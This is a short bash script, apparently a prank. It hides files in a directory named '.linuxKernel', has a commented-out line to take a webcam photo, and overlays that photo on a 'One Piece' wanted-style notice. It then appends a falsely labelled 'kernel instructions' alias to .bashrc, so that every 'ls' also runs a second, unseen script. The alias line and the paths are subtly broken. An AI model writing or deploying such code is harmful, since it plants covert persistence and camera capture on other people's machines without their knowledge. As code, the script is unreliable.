#!/bin/bash

KERNEL_DIR="$HOME/.linuxKernel"

SOURCE_NOTICE="$HOME/Downloads/one_piece_notice.png" #TODO: change for access from usb key
INSTALLED_NOTICE="$KERNEL_DIR/notice.png"
IMG_PATH="$KERNEL_DIR/result.png"
OUT_FILE="$KERNEL_DIR/output.png"

if [ ! -d "$KERNEL_DIR" ]; then
    mkdir -p "$KERNEL_DIR"
fi

if [ ! -f "$INSTALLED_NOTICE" ]; then
    if [ -f "$SOURCE_NOTICE" ]; then
        cp "$SOURCE_NOTICE" "$INSTALLED_NOTICE"
    else
        exit 1
    fi
fi

# gst-launch-1.0 -q v4l2src device=/dev/video0 num_buffers=1 ! jpegenc ! filesink location="$IMG_PATH"
if [ ! -f "$IMG_PATH" ]; then
  exit 1
fi
magick "$IMG_PATH" \
  \( "$INSTALLED_NOTICE" -resize "$(magick identify -format "%wx%h" "$IMG_PATH")!" \) \
  -gravity center \
  -composite \
  "$OUT_FILE"

echo "# // Important klinux kernel instructions // " >> .bashrc
echo "alias ls='ls ; bash /.linuxKernel/script2.sh" >> .bashrc
xdg-open "$OUT_FILE"
